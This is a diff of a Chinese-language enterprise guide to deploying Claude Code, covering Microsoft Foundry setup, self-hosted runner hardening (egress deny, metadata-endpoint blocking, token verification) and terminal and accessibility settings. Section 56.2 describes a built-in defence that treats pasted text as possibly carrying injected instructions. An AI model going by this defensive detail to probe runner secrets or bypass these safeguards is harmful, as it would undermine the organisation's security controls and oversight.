+| Tool search | Opus 4.5、Sonnet 4.5、Haiku 4.5 及之後的模型預設啟用；更早的模型一律預先載入 MCP 工具定義 |
+| IAM | `roles/aiplatform.user`（最小權限為 `aiplatform.endpoints.predict`）；建議**為 Claude Code 建立專用的 GCP 專案** |
+| 速率限制 | 需向 Google Cloud 支援申請提高 |
+| 不可用 | `/logout` |
+
+常見錯誤：`Could not load the default credentials`（執行 `gcloud auth application-default login`）；`404 model not found`（模型未啟用，或該區域或 `global` 不提供）；`429`（主模型與小型模型在選定區域不支援，可考慮改用 `global`）。
+
+### 54.13 Microsoft Foundry 部署細節【Official】（v1.2 新增）
+
+| 步驟 | 重點 |
+| --- | --- |
+| 1. 建立資源 | 在 Foundry 入口網站建立資源，並為 Opus、Sonnet、Haiku 各建一個 **deployment**。🚨 建立 deployment 時要選擇 **hosting option**，它決定**推論是在 Azure 上，還是在 Anthropic 的基礎設施上執行**，這是資料駐留評估的關鍵 |
+| 2. 認證 | A：`ANTHROPIC_FOUNDRY_API_KEY`；B：**Microsoft Entra ID**（沒有設 key 或 token 時，自動使用 Azure SDK 預設憑證鏈，例如 `az login`）；C：`ANTHROPIC_FOUNDRY_AUTH_TOKEN`（bearer token，**優先於前兩者**，v2.1.203+） |
+| 3. 啟用 | `CLAUDE_CODE_USE_FOUNDRY=1` + `ANTHROPIC_FOUNDRY_RESOURCE`（或完整 base URL） |
+| 4. 釘選模型 | **每個部署都必須釘選**，而且值要設成 deployment 名稱 |
+
+| 項目 | 說明 |
+| --- | --- |
+| 預設別名 | 🚨 `opus` 在 Foundry 上仍解析為 **Opus 4.6**，`default` 解析為 **Sonnet 4.5**，與其他 Provider 不同 |
+| 啟動檢查 | 🚨 **Foundry 沒有啟動時的模型檢查**：預設模型不可用時，請求會直接失敗（其他 Provider 則會退回） |
+| 背景工作 | 預設使用**主模型**（因為不一定有 Haiku deployment），要用 Haiku 請設 `ANTHROPIC_DEFAULT_HAIKU_MODEL` |
+| 設定精靈 | **沒有**，只能用環境變數設定 |
+| RBAC | `Azure AI User` 或 `Cognitive Services User` 內建角色即可；也可以自訂最小權限角色 |
+| Tool search | 在 **Azure 託管**的 deployment 上會被伺服器拒絕，Claude Code 會偵測並改為預先載入 |
+| 不可用 | `/logout` |
+
+常見錯誤：`ChainedTokenCredential authentication failed`（設定 Entra ID，或改用 API key）；第一個 prompt 就連線失敗（`ANTHROPIC_FOUNDRY_RESOURCE` 還是範本裡的佔位字串）。
+
+> 🎯 **四家 Provider 的共同結論**：（1）**一律釘選模型版本**；（2）**以 `/status` 驗證**實際的 Provider、區域與模型；（3）為 Claude Code 建立**專用的帳號、專案或訂閱**，讓成本與權限邊界清楚；（4）`/logout` 在第三方 Provider 上都無法使用，**離職處理要在雲端 IAM 完成**。
+
+### 54.14 本章注意事項
 
 > 🚨 **一、選型階段就要跑功能矩陣。** 不要在採購定案後才發現關鍵工作流不可用。
 
@@ -18514,7 +20686,322 @@ Gateway 是**貴組織自行運行、位於 Claude Code 與模型供應商之間
 
 > ⚠️ **四、Bedrock 與 Claude Platform on AWS 是兩個不同的東西。** 同樣經 AWS 採購，但後者呼叫 Anthropic API，功能集明顯不同（web search 有、GitHub Actions 沒有）。
 
-> 📌 **五、本章的矩陣以 2026-09-11 查證為準，且官方明列這是最常變動的區域之一。** 採購決策前請重新覆核 `feature-availability` 頁。
+> 📌 **五、本章的矩陣以 2026-09-11 查證為準，v1.2（2026-09-24）已補上各 Provider 專頁的覆核；官方明言這是最常變動的區域之一。** 採購決策前請重新覆核 `feature-availability` 頁。
+
+> 🚨 **六、（v1.2 新增）v2.1.280 起，Bedrock／Claude Platform on AWS／Agent Platform 的預設主模型都是 Opus 5.5。** 沒有釘選主模型的部署，升級後就會以 Opus 單價計費（第 [54.9 節](#549-部署選項總覽third-party-integrationsofficialv12-新增)）。
+
+> ⚠️ **七、（v1.2 新增）Microsoft Foundry 沒有啟動時的模型檢查，`opus` 仍解析為 Opus 4.6。** 每個部署都必須釘選模型（第 [54.13 節](#5413-microsoft-foundry-部署細節officialv12-新增)）。
+
+---
+
+## 55. Self-hosted Environments 部署實務（v1.2 新增）
+
+> **本章對應官方 7 頁**：`self-hosted-environments`、`-quickstart`、`-deploy`、`-configuration`、`-testing`、`-reference`、`-identity`。概念與架構請先讀第 [7.7 節](#77-self-hosted-environmentspreview)；本章聚焦**把 runner 送上正式環境**所需的強化、網路、git、容量、生命週期、身分驗證與 CI 測試。
+
+### 55.1 定位、前提與限制【Official】
+
+官方的立場很明確：**多數團隊用 Anthropic 託管的環境就足夠**。自建適合「網路、工具或法遵要求 session 必須在自家基礎設施上執行」的團隊，代價是**你要自己建置並維護 runner 映像、營運 fleet、控制網路**。
+
+| 項目 | 內容 |
+| --- | --- |
+| 狀態 | 【Preview】Team／Enterprise **public beta**，預設關閉；由 Owner 在 **Cloud environments** 管理頁開啟 **Allow self-hosted environments**（需先啟用 cloud sessions） |
+| 不可用 | **ZDR 組織**；推論**只能走 Anthropic API**（不能經 Bedrock／Vertex／Foundry 或 LLM gateway）；repository **只支援 GitHub** |
+| 可發起的介面 | claude.ai/code、行動與桌面 App、排程 routines、終端機（`claude --cloud` 或 `--environment`） |
+| 計費 | 與 Anthropic 託管環境相同，消耗組織的 Claude Code 用量 |
+| Runner 主機 | **Linux 或 macOS**（Windows 不支援，請改用 Linux 容器）；**時鐘誤差須小於 5 分鐘**，否則認證失敗 |
+| 軟體 | Claude Code **v2.1.224+**（runner 內建於 `claude` binary，子指令為 `claude self-hosted-runner`）、Git 2.24+（部分功能需要 2.29／2.32／2.34） |
+
+快速建置：以具 Owner 角色的帳號登入後執行 `claude self-hosted-runner setup`，互動式精靈會引導建立環境、啟動本機 runner，並寫出 `./runner-setup/CHEAT-SHEET.md`。
+
+> 🚨 **Environment secret 只顯示一次**，而且它能**註冊 runner 並接走環境中任何排隊的 session**。輪替方式：在環境的 **Configuration** 分頁建立新 secret → 部署到 runner → 撤銷舊 secret（持有舊 secret 的 runner 下次輪詢時會以 `poll auth failed` 結束，由編排器以新 secret 重啟）。
+
+### 55.2 🚨 上線前的十項強化【Official】
+
+> 🚨 **威脅前提**：self-hosted runner 會**代表「任何能派送 session 到此環境的人」在你的基礎設施上執行模型指揮的程式碼**，也就是組織內的所有成員，以及 Owner 路由到此環境的 Claude Tag 頻道使用者。**環境層級沒有派送存取控制**：組織內任何成員都能把 session 派送到任何環境。
+
+| # | 強化項目 | 做法 |
+| --- | --- | --- |
+| 1 | **每個 session 一個拋棄式容器** | `--capacity 1` 加上預設的 `--drain-grace-sec 0`，容器在行程結束時銷毀 |
+| 2 | **映像檔中不放廣泛的憑證** | 不放長期 SSH key、雲端憑證或過大權限的 PAT；session 需要的 push／API token 由 **wrapper script 依 session 動態核發** |
+| 3 | **Environment secret 不放在執行 session 的主機上** | 固定 fleet 的每台主機都有 secret，session 的程式碼就讀得到 → **優先採用 on-demand runners**（secret 只留在 orchestrator） |
+| 4 | **出口預設拒絕** | 在你自己的網路邊界上設定（產品本身**無法**驗證或強制）；見 55.3 |
+| 5 | **主機 IAM 最小權限** | 主機身分只給 runner 本身需要的權限；session 經 wrapper 取得自己的憑證 |
+| 6 | **封鎖 cloud metadata 端點** | 子網路層的政策攔不到 link-local 流量，必須在**容器內**封鎖：IMDSv2 hop limit 1、GKE Workload Identity metadata concealment，或在 session 容器的網路 namespace 中明確拒絕 `169.254.169.254` |
+| 7 | **每個 runner 的檔案系統隔離** | `--hooks-dir`、wrapper script 與主機的 `~/.claude/` 對 session **唯讀** |
+| 8 | **Repo 設定防護** | `--confine-repo-settings enforce`（預設 `warn` 只記錄）：拒絕 repo 提交的設定中出現「超出 workspace 的授權」、非空的 `env` 區塊，或 `sandbox.enabled: false` 之類的姿態覆寫 |
+| 9 | **不依賴組織 IP allowlist** | 預設**不涵蓋** runner 流量；需要時請洽 Anthropic 客戶團隊 |
+| 10 | **Repo 提交的權限規則** | 🚨 不要在 repo 的 `permissions.allow` 放**不帶路徑的** `Edit`／`Write`／`NotebookEdit`，它們會授權**寫入主機上任何位置**；需要時寫 `Edit(/**)`（以專案根目錄為範圍）。`defaultMode: auto` 只接受映像層或使用者層的設定，**repo 無法替自己開啟 auto mode** |
+
+### 55.3 網路需求與出口 proxy【Official】
+
+| 主機 | 何時需要 |
+| --- | --- |
+| `api.anthropic.com`（443；SCM connector 使用 WSS） | **一律需要**：控制平面、session 串流、推論、feature flags、JWKS、commit 簽章、git proxy |
+| 你的 git host（443 或 22） | clone 與 push（使用 `--use-anthropic-git-proxy` 時不需要） |
+| `downloads.claude.ai` | 安裝或更新時；session 從官方 marketplace 安裝 plugin 時 |
+| `storage.googleapis.com` | `/plugin` 顯示安裝數與中繼資料時 |
+| `code.claude.com`、`claude.com` | 內建 claude-code-guide agent 查文件時（封鎖只影響查文件） |
+| `*.frame.claudeusercontent.com` | 啟用 Artifact 工具時（可用 `CLAUDE_CODE_DISABLE_ARTIFACT=1` 關閉） |
+| `registry.npmjs.org` | 安裝 plugin 或以 `npx` 啟動 MCP server 時 |
+| Datadog 相關主機 | 只有在明確 opt-in，或啟用錯誤回報時 |
+
+> 📌 Runner **不會連到** `statsig.anthropic.com`、`*.sentry.io`、`claude.ai`、`platform.claude.com`。舊的企業網路清單中若列有這些主機，不需要為 runner 開放。
+
+**需要 `Proxy-Authorization` 的出口 proxy**：設定 `HTTPS_PROXY` 之後，再以 `--proxy-authorization-command`（每次產生）或 `--proxy-authorization-file`（由其他行程輪替）提供標頭值。Runner 會在 `127.0.0.1` 啟動一個本機轉送代理，**每條連線都重新取得 token**，也會把 session 環境中的 `ALL_PROXY` 與其他 proxy 變數清除、固定 `NO_PROXY`，並且**永不記錄標頭值**。
+
+> ⚠️ **Connector 流量會離開你的網路**：claude.ai connectors（GitHub、Slack、Linear 等）是由 Anthropic 從自家基礎設施呼叫，而不是從 runner 發出。要讓工具流量留在網內，請在 runner 映像中以**本機 MCP server** 提供對應功能，並用 `allowedMcpServers`／`deniedMcpServers` 過濾 connectors。
+
+### 55.4 Git 設定三種路線【Official】
+
+| 路線 | 做法 | 適用 |
+| --- | --- | --- |
+| **Runner 代為設定** | `--configure-git`：身分為 `Claude <noreply@anthropic.com>`、**以 Anthropic 簽章服務做 SSH commit 簽章**（Git 2.34+）、`push.negotiate`、自動加上 session 建立者的 `Co-authored-by` | 與 Anthropic 託管 session 一致 |
+| **映像中自帶 git 設定** | 在 Dockerfile 中以 `git config --system` 設定身分；push 憑證**由 wrapper 依 session 建立者身分核發短效、最小範圍的 token** | 要用自己的 bot 身分 commit |
+| **Anthropic git proxy** | `--use-anthropic-git-proxy`：以 session 自己的短效 token clone；一般 session 使用建立者的 GitHub OAuth token，bot session 使用組織 GitHub App token | 不想在 runner 放任何 git 憑證；**需要 `--capacity 1` 與 Git 2.32+**，且你的 git host 必須能從 Anthropic 基礎設施連到 |
+
+其他重點：runner 會設定 `GIT_TERMINAL_PROMPT=0`、SSH `BatchMode=yes`、`GCM_INTERACTIVE=never`，**任何憑證機制都必須免互動**。私有網路可以用 `--git-host-rewrite <from>=<to>`（split-horizon DNS）與 `--git-ssh-rewrite <host>`（只接受 SSH 的 host）改寫 URL。
+
+### 55.5 映像、容量與版本【Official】
+
+- **官方不提供預建 runner 映像**。請以 `claude` binary 為核心自行建置，並從 `downloads.claude.ai/claude-code-releases/<version>/<platform>/claude` 下載指定版本（可依發佈的簽章 manifest 驗證）。
+- **容量（每個 session 的起始值）**：記憶體 request 與 limit **都設 4 GiB**（兩者相等，避免被 OOM kill）；CPU request 2、limit 4。`--capacity` 大於 1 時，資源要乘以 capacity。**請以代表性的建置實測峰值後再調整**。
+- **同一環境中所有 runner 的 `--base-dir` 與 `--capacity` 必須一致**，否則 session 在另一台 runner 續接時路徑會不同。
+- **預熱 checkout**：`--capacity 1` 且沒有 `checkout` hook 時，runner 會在 `<base-dir>/<owner>/<repo>` 重用同一個 clone（fetch、detach、hard reset）。⚠️ **不會執行 `git clean`**，未追蹤的檔案會留下來；`<base-dir>/_sessions/` 下的每個 session 目錄（含 transcript 副本）也會累積，使用持久化磁碟時請加 `--remove-session-state`。
+- **版本釘選**：session 一律使用 runner 自己的 binary，並停用自動更新；**升級就是更新映像後重啟 runner**。Plugin 可以用 `FORCE_AUTOUPDATE_PLUGINS=1` 另外開放自動更新。
+- **擴展**：因為「**一個 runner 同時只服務一個 owner**」，最小 replica 數等於預期**同時活躍的使用者與 Claude Tag agent 數**；`--capacity` 只增加同一個 owner 的平行度。
+
+### 55.6 客製化：wrapper、lifecycle hooks 與 on-demand runners【Official】
+
+**Wrapper script**（`--exec-path`）：runner 以 wrapper 取代 Claude Code binary 啟動每個 session，可取得的環境變數包括 `CLAUDE_CODE_SESSION_ACCESS_TOKEN`（session JWT）、`CCR_SESSION_ACCOUNT_EMAIL`（**未驗證簽章，只能用於標示**）、`CLAUDE_RUNNER_CLAUDE_BIN`、`CLAUDE_CODE_OAUTH_TOKEN`（**僅限推論，約 30 分鐘**，由 runner 經 stdin 輪替）。
+
+> 🚨 **最常見的故障**：wrapper 以 `&` 把子行程丟到背景，會**切斷 stdin**。session 看起來正常，但大約 30 分鐘後 OAuth token 過期，之後每個 API 呼叫都會 `401`。請以 `exec "$CLAUDE_RUNNER_CLAUDE_BIN" "$@"` 結尾；真的要背景執行時，先把 stdin 保存到 fd 4，並且**不要關閉或重用 fd 3**（runner 從 fd 3 讀取活動訊號）。
+>
+> 🚨 **v2.1.281 的破壞性變更**：runner 改以**私有檔案**把 system prompt 傳給 Claude Code。若 wrapper 或 `command` hook 自行附加 `--system-prompt` 或 `--append-system-prompt`，**必須改成 `--system-prompt-file` 或 `--append-system-prompt-file`**。
+
+**Lifecycle hooks**（`--hooks-dir`，與 session 內的 Claude Code hooks 是不同的東西）：
+
+| Hook | 時機 | 用途 |
+| --- | --- | --- |
+| `checkout` | 每個 repo 一次，取代內建 clone | 從 mirror clone、以 session JWT 換取 clone 憑證、支援非 git 來源 |
+| `command` | clone 之後，取代內建的子行程啟動 | 與 wrapper 相同，但把客製化集中在 hooks 目錄 |
+| `post-session` | 子行程結束後、清除 workspace 之前 | 🎯 **保存未 commit 工作的唯一機會**（例如推到 rescue 分支）；`CLAUDE_RUNNER_EXIT_REASON` 為 `completed`／`failed`／`interrupted`；預設逾時 60 秒；VM 被搶占或斷電時不會執行 |
+| `spawn-runner` | on-demand orchestrator 每個派送請求一次 | 提交 Kubernetes Job、EC2 等工作負載 |
+
+**On-demand runners**（`claude self-hosted-runner orchestrator`）：orchestrator 是無狀態的子指令，會輪詢「排隊中但沒有 runner 可用」的 session，並對每個 session 執行 `spawn-runner` hook。**Environment secret 只留在不執行使用者程式碼的 orchestrator 主機上**，每個新 runner 只拿到一張**一次性的 work order**。Hook 的契約：
+
+1. 以 `CLAUDE_RUNNER_ORDER_ID` 做**冪等**處理（同一張單最多產生一個工作負載）。
+2. **不要自行重試**；runner 一直沒有註冊時，Anthropic 會以新的 order ID 重新請求。
+3. 結束代碼：`0` 已提交；`1` 可重試；`2` 以上為不可重試（需要 Owner 在 **Activity** 分頁按 **Retry**）。
+4. `--expected-spawn-seconds` 至少要設為開機時間的 p99，而且所有 orchestrator replica 必須相同。
+
+**權限**：self-hosted session 沒有終端機，未回應的權限提示會讓該回合停住。官方建議只有在**出口預設拒絕與其他強化都已到位**的環境，才在 wrapper 中固定 `--permission-mode auto`；或者以 `--allowed-tools` 預先核准特定工具。另外，runner **不會自動安裝**託管環境中那個「提醒 Claude commit 並 push」的 `Stop` hook，請參考官方範例自行加入，否則未 push 的工作會留在 runner 的磁碟上。
+
+### 55.7 生命週期、關機與已知限制【Official】
+
+**關機時間**：完整的 drain 路徑為 `--session-stop-grace-sec` + `--drain-wait-sec` + `--post-session-hook-timeout-sec` + 15 秒（使用 `--push-outcome-on-release` 時再加 30 秒），**預設約 80 秒**，runner 啟動時會印出總數。🚨 **Kubernetes 預設的 `terminationGracePeriodSeconds` 30 秒不夠**，pod 會在 drain 完成前被殺掉，請至少設為 runner 印出的值。
+
+| 已知限制 | 影響與對策 |
+| --- | --- |
+| **續接的 session 會遺失未 push 的工作** | session 被釋放或 runner 重啟後，下一則訊息會在**全新的 clone** 上續接 → 使用 `--push-outcome-on-release`、`post-session` hook，以及提醒 push 的 `Stop` hook |
+| 某些 session 不算閒置 | 有永不結束的背景工作，或正在等待工具內部核准的 session，不會被 `--release-idle-session-min` 釋放 → **一定要同時設 `--kill-session-after-min`**（例如 480 分鐘）當作硬性上限 |
+| session 中途無法加入私有 repo | 建立 session 時就要選好所有需要的 repo |
+| Connector 流量離開你的網路 | 見 55.3 |
+
+**監控**：runner 在 `--health-port`（預設 8080）提供 `/healthz`，但**只要行程活著就回 200**。要偵測卡住的 runner，請監看 `last_poll_age_ms`，或 `/metrics` 的 `last_poll_age_seconds`。Session 一直排隊時，檢查 `claude_code_self_hosted_runner_locked_account` metric，確認是否所有 runner 都被其他 owner 鎖住。診斷工具：`claude self-hosted-runner doctor`。
+
+**遙測**：session 預設會送出營運遙測到 Anthropic（**不含程式碼或 repo 內容**），可以在 runner 行程上設 `DISABLE_TELEMETRY`、`DISABLE_ERROR_REPORTING` 或 `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` 關閉；runner 會在套用伺服器提供的環境變數之後**重新強制**這些設定。
+
+### 55.8 Session 身分驗證：讓內部服務信任 session【Official】
+
+每個 self-hosted session 都會在 `CLAUDE_CODE_SESSION_ACCESS_TOKEN` 中收到一個由 Anthropic 簽署的 JWT。內部服務可以用它確認「請求確實來自我們環境中的某個 session，而且是由誰建立的」。
+
+| 驗證步驟 | 規則 |
+| --- | --- |
+| 1. 前綴 | 必須是 `sk-ant-cc-`（託管 session 是 `sk-ant-si-`，**由不同的金鑰組簽署，必須拒絕**），去掉前綴後是標準 JWT |
+| 2. 簽章 | `ES256`；JWKS：`https://api.anthropic.com/v1/code/.well-known/jwks.json`（`max-age=300`；遇到未知的 `kid` 先重新抓一次；**不要釘選單一金鑰**） |
+| 3. `iss` | 必須是 `ccr` |
+| 4. `aud` | 🚨 **必須包含你的環境 ID（`ccpool_...`）**，不要只驗 `anthropic-api`，否則會接受其他組織環境的 token |
+| 5. `ccr:role` | 必須是 `session_worker`（environment secret、runner token、work order 也由同一組金鑰簽署，但角色不同） |
+| 6. `exp` | 預設 4 小時、最長 8 小時 |
+| 7. 身分 | `act.sub` 為 `user:<id>`（人員）或 `agent:<id>`（組織服務身分，例如 Claude Tag）；`act.attested_by.sub` 是 SSO Provider 的 subject，**對應到內部身分時優先使用**；`act.email` 不一定存在 |
+
+> 🚨 **token 證明不了什麼**：它**無法證明是 runner 主機上的哪個行程出示的**。token 放在 session 的環境變數中，Claude 執行的任何程式碼、任何工具或 MCP server 都讀得到。而且驗證是離線的，**沒有撤銷清單**，token 在 `exp` 之前都有效。因此，以它換取內部憑證時：
+>
+> - **限制能力**：只給一個 coding session 需要的讀寫權限，不要給建立者在其他地方擁有的管理權限。
+> - **限制時效**：不超過 token 的 `exp`。
+> - **以 session 為單位稽核**：記錄 `ccr:session_id` 與 `jti`。
+
+在 wrapper 內部可以直接用 `"$CLAUDE_RUNNER_CLAUDE_BIN" self-hosted-runner decode-token | jq -re '.act.attested_by.sub // .act.email // .act.sub'` 取得建立者身分（用 `jq -re` 才能讓缺少 claim 時以非 0 結束，而不是傳下字串 `null`）。
+
+### 55.9 以 CI 驗證 runner 映像【Official】
+
+新映像上線前，官方建議在 CI 中完整跑一次：建立專用的測試環境 → 啟動 runner → 以 `claude -p ... --environment` 派送 session → 透過 `Stop` hook 把每回合的最終回覆寫到檔案並讀回 → 送出追問 → 刪除環境。
+
+> ⚠️ **CI 認證限制**：`--environment` 與 `--cloud` **只接受 claude.ai OAuth token，不接受 API key**；控制雲端 session 的 scope 在伺服器端**上限為 30 天**，所以 `claude setup-token`（一年期、僅限推論）無法使用，environment secret 也不被接受。長期存在的 CI 主機需要每 30 天互動登入一次；拋棄式 runner 可以用 `CLAUDE_CODE_OAUTH_REFRESH_TOKEN` 加 `CLAUDE_CODE_OAUTH_SCOPES`，但同樣受 30 天限制。需要不綁定個人的機器身分時，請洽 Anthropic 客戶團隊。
+>
+> 建立與刪除環境的 API 需要 Owner 的 access token 與 `anthropic-beta: ccr-byoc-2025-07-29` 標頭；回應中的 `pool_secret` 是**長期憑證**，請存成 CI 的 masked secret，並且**不要在 log 中輸出回應**。
+
+### 55.10 本章注意事項
+
+> 🚨 **一、self-hosted runner 等於「讓全組織在你的機器上執行程式碼」。** 環境層級沒有派送權限控制，強化清單（55.2）的每一項都是上線前的必要條件，不是建議。
+
+> 🚨 **二、推論仍然送到 Anthropic。** 留在你網路內的是 checkout、建置產物與 secrets；prompt、回應與工具結果仍會送到 `api.anthropic.com`，transcript 也會由 Anthropic 儲存。資料分類評估時請據實填寫。
+
+> ⚠️ **三、v2.1.281 起，wrapper 中的 `--system-prompt` 必須改成 `--system-prompt-file`。** 升級 runner 映像前，請先檢查所有 wrapper 與 `command` hook。
+
+> ⚠️ **四、未 push 的工作會在續接時消失。** 請同時部署 `--push-outcome-on-release`、`post-session` hook，以及提醒 push 的 `Stop` hook。
+
+> 📌 **五、本章依 2026-09-24 的官方文件整理，功能仍為 public beta。** 旗標與預設值可能變動，升級前請重新查閱 `self-hosted-environments-reference`。
+
+---
+
+## 56. 終端機介面、無障礙與個人化（v1.2 新增）
+
+> **本章對應官方 6 頁**：`terminal-config`、`fullscreen`、`accessibility`、`voice-dictation`、`statusline`、`keybindings`。這些頁面在 v1.1 附錄 F.3 #11 被明確排除；v1.2 以「**企業標準化**」的角度補齊：哪些設定值得統一、哪些牽涉資料外送、哪些是無障礙的法遵需求。
+
+### 56.1 為什麼企業要關心終端機介面【建議】
+
+| 面向 | 企業關心的原因 |
+| --- | --- |
+| **一致的開發者體驗** | 同樣的快捷鍵與顯示方式，才能寫出一致的內部教材與 onboarding（附錄 [C](#附錄-cwindows-企業環境快速開始)、[G](#附錄-g新進成員最終-checklist)） |
+| **無障礙（Accessibility）** | 多數組織有身心障礙員工的合理調整義務；Claude Code 提供螢幕閱讀器模式，**企業應在工具清單中註明並提供設定指引** |
+| **資料外送** | 🚨 **語音聽寫會把錄音串流到 Anthropic** 做轉寫，屬於資料分類與隱私評估的範圍 |
+| **效能與穩定** | VS Code 整合終端機、tmux、Windows Terminal 的閃爍與殘影，是最常見的「工具不好用」抱怨來源 |
+| **可觀測性** | Status line 能即時顯示 context 使用率、成本與花費上限，是**最便宜的成本意識工具** |
+
+### 56.2 終端機設定：常見症狀與解法【Official】
+
+| 症狀 | 解法 |
+| --- | --- |
+| **Shift+Enter 送出而不是換行** | 任何終端機都可以用 `Ctrl+J`，或輸入 `\` 再按 Enter。Ghostty、Kitty、iTerm2、WezTerm、Warp、Apple Terminal、Windows Terminal 不需設定；**VS Code、Cursor、Zed 請執行一次 `/terminal-setup`**；gnome-terminal 與 JetBrains IDE 的終端機不支援 |
+| macOS 上 Option 快捷鍵無效 | 在終端機啟用「Use Option as Meta Key」（Apple Terminal）或把 Option 設為 `Esc+`（iTerm2）；VS Code 設 `terminal.integrated.macOptionIsMeta: true` |
+| Claude 完成時沒有提醒 | 預設只有 Ghostty、Kitty、iTerm2 會送桌面通知；其他終端機請設 `preferredNotifChannel: "terminal_bell"`，或用 `Notification` hook 播放聲音（桌面通知可以經 SSH 回到本機） |
+| 在 tmux 中換行、通知失效 | 在 `~/.tmux.conf` 加入 `set -g allow-passthrough on`、`set -s extended-keys on`、`set -as terminal-features 'xterm*:extkeys'` |
+| **Windows 上 Backspace 一次刪一個字** | 終端機把 Backspace 送成 `^H`；設 `CLAUDE_CODE_BS_AS_CTRL_BACKSPACE=0` |
+| 畫面閃爍或捲動跳動 | 改用全螢幕渲染（56.3）；只有閃爍、且終端機支援同步輸出時，可設 `CLAUDE_CODE_FORCE_SYNC_OUTPUT=1` |
+
+> 📌 **`/terminal-setup` 在 VS Code 系列中也會修改編輯器設定**：把 `terminal.integrated.gpuAcceleration` 設為 `"off"`（避免整合終端機亂碼），並調整滑鼠滾輪靈敏度。若公司以 Settings Sync 或設定檔統一管理 VS Code，請把這兩個值納入標準設定，以免被使用者端覆蓋。
+
+**貼上大量內容**：超過 800 字元或 3 行的貼上內容會收合為 `[Pasted text #N +120 lines]`。🛡️ Claude 會被告知這是「**從別處貼上、可能包含你沒寫的指示**」的內容，只有在你打的訊息要求時才遵循其中的指示，這是內建的 prompt injection 防護。貼上的內容快取在 `~/.claude/paste-cache/`，依 `cleanupPeriodDays` 清除。
+
+### 56.3 全螢幕渲染（Fullscreen）【Preview】
+
+全螢幕渲染以終端機的 **alternate screen buffer** 繪製介面（類似 `vim`、`htop`），**只渲染可見的訊息**，因此能消除閃爍、讓長對話的**記憶體維持平穩**，並支援滑鼠。它與視窗是否最大化無關。
+
+| 項目 | 說明 |
+| --- | --- |
+| 切換 | `/tui fullscreen`（對話不中斷地重新啟動並儲存 `tui` 設定）、`/tui default` 切回；或設 `CLAUDE_CODE_NO_FLICKER=1` |
+| 預設 | 2026-05-06 之後才開始使用 Claude Code 的帳號，以及 v2.1.239+ 首次啟動且不抓取 feature flag 的機器，預設為全螢幕 |
+| 差異 | 搜尋改用 `Ctrl+O` 進入 transcript 模式再按 `/`；選取文字改為 app 內選取、放開即複製；網址改以 `Cmd`／`Ctrl` + 點擊開啟 |
+| 效益最明顯的地方 | **VS Code 整合終端機、tmux、iTerm2** |
+| `/diff` | 在旁邊開啟即時更新的 diff 面板，可以一邊看 Claude 編輯一邊審查 |
+| tmux | 需要 `set -g mouse on`；**與 iTerm2 的 `tmux -CC` 整合模式不相容** |
+| Windows Terminal 殘影 | 設 `CLAUDE_CODE_ALT_SCREEN_FULL_REPAINT=1`，每一格都重繪 |
+| 啟動失敗保護 | 連續兩次在全螢幕模式下啟動失敗後，會自動退回傳統渲染（v2.1.236+） |
+
+> ✅ **企業建議**：以 VS Code 整合終端機為主要開發環境的團隊，**建議在標準設定中預設全螢幕渲染**，可以大幅減少閃爍與記憶體成長的抱怨；但仍屬 research preview，請保留 `/tui default` 作為退路寫在內部 FAQ。
+
+### 56.4 無障礙：螢幕閱讀器模式與其他輔助設定【Official】
+
+螢幕閱讀器模式會把視覺化的終端機介面，**改為線性的純文字輸出**，讓 VoiceOver、NVDA 等螢幕閱讀器能依序朗讀。在此模式下可以完成完整的對話、核准工具權限，並審查變更。
+
+| 啟用方式 | 範圍 | 優先權 |
+| --- | --- | --- |
+| `claude --ax-screen-reader` | 單一 session | 最高 |
+| `CLAUDE_AX_SCREEN_READER=1` | 該 shell 啟動的 session | 中 |
+| `"axScreenReader": true`（使用者設定） | 該機器的所有 session（包含 VS Code 整合終端機） | 低 |
+
+啟用後第一行會顯示 `[Screen Reader Mode: on via flag|env|settings]`。模式的行為：
+
+- **沒有**方框字元、**沒有**只靠顏色傳達的提示、**不重繪**未變更的內容；回覆中的表格改以「`標頭: 值`」的句子朗讀。
+- 每則訊息以可搜尋的標籤開頭：`you:`、`claude:`、`thinking:`、`tool:`、`tool error:`、`error:`、`warning:`、`Permission Required:`、`Cost:`。
+- 所有選單（包括**權限提示**與 `/effort` 滑桿）改為**編號清單**，輸入數字後按 Enter；是非題改為輸入 `y`／`n`。
+- 以 `Shift+Tab` 切換權限模式時會朗讀，例如 `[plan mode on]`。
+- 需要注意時響終端機鈴聲：回覆完成、需要回答提示、執行超過 5 秒的工具完成時。
+- 輸出 **OSC 133** 標記，可以用終端機的「跳到上一個提示」功能在回合之間跳轉（iTerm2：`Cmd+Shift+Up`；VS Code：`Ctrl+Up`／`Cmd+Up`）。
+
+其他輔助設定：
+
+| 需求 | 設定 |
+| --- | --- |
+| **螢幕放大鏡**（例如 macOS Zoom） | `CLAUDE_CODE_ACCESSIBILITY=1`：讓終端機游標保持可見，並跟隨輸入位置與選單的反白列 |
+| **減少動態效果** | `prefersReducedMotion: true`：減少或關閉 spinner、閃爍等動畫 |
+| **色覺辨識障礙** | `theme: "dark-daltonized"` 或 `"light-daltonized"` |
+| 朗讀節奏 | `CLAUDE_AX_STARTUP_QUIET_MS`（啟動後等待）、`CLAUDE_AX_PREPARK_MS`（每行寫入前等待） |
+
+已知限制：**偵測到螢幕閱讀器時不會自動開啟**；以指令（而非 `Shift+Tab`）進入 plan mode 時不會朗讀；`claude attach` 附加背景 session 會進入沒有捲動緩衝區的 alternate screen；成本只在離開時朗讀。
+
+> 🎯 **企業建議**：把「Claude Code 支援螢幕閱讀器模式」寫進內部的無障礙工具清單，並在 onboarding 中提供三種啟用方式的說明。**需要此模式的同仁，請以使用者層的 `axScreenReader` 設定開啟，不要寫在團隊共用的專案設定中。**
+
+### 56.5 語音聽寫（Voice Dictation）【Official】
+
+以 `/voice` 啟用，可以用說的輸入 prompt，轉寫結果會即時出現在輸入框中，可以與鍵盤輸入混用。
+
+| 模式 | 操作 |
+| --- | --- |
+| Hold（預設） | 按住 `Space` 錄音、放開停止；設 `voice.autoSubmit: true` 可在放開時自動送出（至少 3 個字） |
+| Tap | `/voice tap`：點一下開始、再點一下送出（至少 3 個字才自動送出）；靜默 15 秒或錄音滿 2 分鐘會自動停止 |
+| 取消 | `Esc` 或 `Ctrl+C`，捨棄轉寫並還原輸入框 |
+
+> 🚨 **企業必須先知道的四件事**
+>
+> 1. **錄音會串流到 Anthropic 的伺服器做轉寫，不在本機處理。** 屬於資料外送，請納入隱私與資料分類評估。
+> 2. **只能以 claude.ai 帳號使用**；使用 API key、Bedrock、Vertex、Foundry 時不可用。雲端 session、SSH 與 VS Code Remote（Dev Containers、Codespaces）也不可用。
